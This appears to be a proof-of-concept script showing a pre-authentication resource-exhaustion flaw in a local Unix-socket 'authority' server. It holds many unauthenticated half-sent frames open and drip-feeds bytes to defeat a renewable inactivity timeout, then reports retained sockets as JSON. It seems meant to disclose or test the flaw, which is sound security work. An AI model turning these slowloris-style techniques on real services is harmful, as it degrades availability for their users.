import fs from "node:fs";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";

const options = parseArguments(process.argv.slice(2));
const modulePath = path.resolve(options.targetDist, "authority", "transport.js");
if (!fs.existsSync(modulePath)) {
  throw new Error(`compiled authority transport not found: ${modulePath}`);
}

const {
  AuthorityUnixServer,
  AUTHORITY_DECISION_TRANSPORT_TIMEOUT_MS,
} = await import(pathToFileURL(modulePath).href);

await runAggregateProof();
await runDripProof();

async function runAggregateProof() {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), "sompi-preauth-aggregate-"));
  fs.chmodSync(directory, 0o700);
  const socketPath = path.join(directory, "authority.sock");
  let handlerInvocations = 0;
  const server = new AuthorityUnixServer({
    socketPath,
    timeoutMs: AUTHORITY_DECISION_TRANSPORT_TIMEOUT_MS,
    async handle() {
      handlerInvocations += 1;
      throw new Error("an incomplete frame must not reach the handler");
    },
  });
  const clients = [];

  await server.start();
  try {
    const incompleteFrame = Buffer.alloc(5);
    incompleteFrame.writeUInt32BE(100, 0);
    incompleteFrame[4] = 0x41;

    for (let index = 0; index < options.count; index += 1) {
      const client = await connect(socketPath);
      client.write(incompleteFrame);
      clients.push(client);
    }

    await delay(25);
    const retained = server.sockets?.size;
    if (retained !== options.count) {
      throw new Error(`expected ${options.count} retained sockets, observed ${retained}`);
    }
    if (handlerInvocations !== 0) {
      throw new Error(`incomplete frames invoked the handler ${handlerInvocations} times`);
    }

    process.stdout.write(`${JSON.stringify({
      scenario: "aggregate",
      unauthenticatedPartialConnections: clients.length,
      serverRetainedSockets: retained,
      configuredTimeoutMs: AUTHORITY_DECISION_TRANSPORT_TIMEOUT_MS,
      handlerInvocations,
    })}\n`);
  } finally {
    for (const client of clients) client.destroy();
    await server.close();
    fs.rmSync(directory, { recursive: true, force: true });
  }
}

async function runDripProof() {
  const timeoutMs = 500;
  const dripIntervalMs = 100;
  const dripCount = 6;
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), "sompi-preauth-drip-"));
  fs.chmodSync(directory, 0o700);
  const socketPath = path.join(directory, "authority.sock");
  let handlerInvocations = 0;
  const server = new AuthorityUnixServer({
    socketPath,
    timeoutMs,
    async handle() {
      handlerInvocations += 1;
      throw new Error("an incomplete frame must not reach the handler");
    },
  });

  await server.start();
  const client = await connect(socketPath);
  try {
    const header = Buffer.alloc(4);
    header.writeUInt32BE(4_096, 0);
    client.write(header);

    const startedAt = Date.now();
    for (let index = 0; index < dripCount; index += 1) {
      await delay(dripIntervalMs);
      client.write(Buffer.from([0x41]));
    }
    const elapsedMs = Date.now() - startedAt;
    await delay(10);

    const retainedAfterDrip = server.sockets?.size === 1 && !client.destroyed;
    if (elapsedMs <= timeoutMs) {
      throw new Error(`drip proof elapsed only ${elapsedMs} ms`);
    }
    if (!retainedAfterDrip) {
      throw new Error("socket did not survive the renewable inactivity timeout");
    }
    if (handlerInvocations !== 0) {
      throw new Error(`incomplete frame invoked the handler ${handlerInvocations} times`);
    }

    process.stdout.write(`${JSON.stringify({
      scenario: "drip",
      timeoutMs,
      elapsedMs,
      retainedAfterDrip,
      handlerInvocations,
    })}\n`);
  } finally {
    client.destroy();
    await server.close();
    fs.rmSync(directory, { recursive: true, force: true });
  }
}

function connect(socketPath) {
  return new Promise((resolve, reject) => {
    const client = net.createConnection({ path: socketPath });
    client.once("connect", () => resolve(client));
    client.once("error", reject);
  });
}

function delay(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

function parseArguments(arguments_) {
  let targetDist;
  let count = 128;

  for (let index = 0; index < arguments_.length; index += 1) {
    const argument = arguments_[index];
    if (argument === "--target-dist") {
      targetDist = arguments_[index + 1];
      index += 1;
    } else if (argument === "--count") {
      count = Number(arguments_[index + 1]);
      index += 1;
    } else {
      throw new Error(`unknown argument: ${argument}`);
    }
  }

  if (typeof targetDist !== "string" || targetDist.length === 0) {
    throw new Error("usage: node poc.mjs --target-dist <relative-dist-path> [--count <positive-integer>]");
  }
  if (!Number.isSafeInteger(count) || count <= 0 || count > 4_096) {
    throw new Error("--count must be a positive integer no greater than 4096");
  }
  return Object.freeze({ targetDist, count });
}
